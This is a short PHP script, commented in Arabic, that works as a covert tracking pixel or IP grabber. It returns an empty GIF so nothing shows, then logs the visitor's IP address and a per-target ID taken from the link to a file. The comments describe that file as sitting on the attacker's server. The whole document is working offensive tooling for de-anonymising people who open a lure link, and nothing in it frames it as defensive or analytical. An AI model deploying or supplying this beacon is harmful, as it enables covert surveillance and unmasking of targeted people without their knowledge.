<?php
// يتم تفعيل رؤوس الطلبات (Headers) لضمان عدم ظهور محتوى للمستخدم
header('Content-Type: image/gif');
header('Content-Length: 0');

// 1. استخلاص البيانات الأساسية من طلب HTTP
// يتم تخزين عنوان IP للعميل المتصل
$proxy_address = $_SERVER['REMOTE_ADDR'];

// استخلاص معرف المستخدم (ID) المحقون في الرابط
$target_id = isset($_GET['id']) ? htmlspecialchars($_GET['id']) : 'Unknown';

// 2. تنسيق البيانات وتخزينها في ملف نصي (سجل)
$log_entry = "[" . date('Y-m-d H:i:s') . "] - Target ID: " . $target_id . " | Proxy/IP Detected: " . $proxy_address . "\n";

// المسار إلى ملف السجل على خادم المهاجم
file_put_contents('proxy_logs.txt', $log_entry, FILE_APPEND);

// 3. إنهاء العملية دون إعادة أي محتوى (يرسل بايت فارغ للصورة)
exit();

?>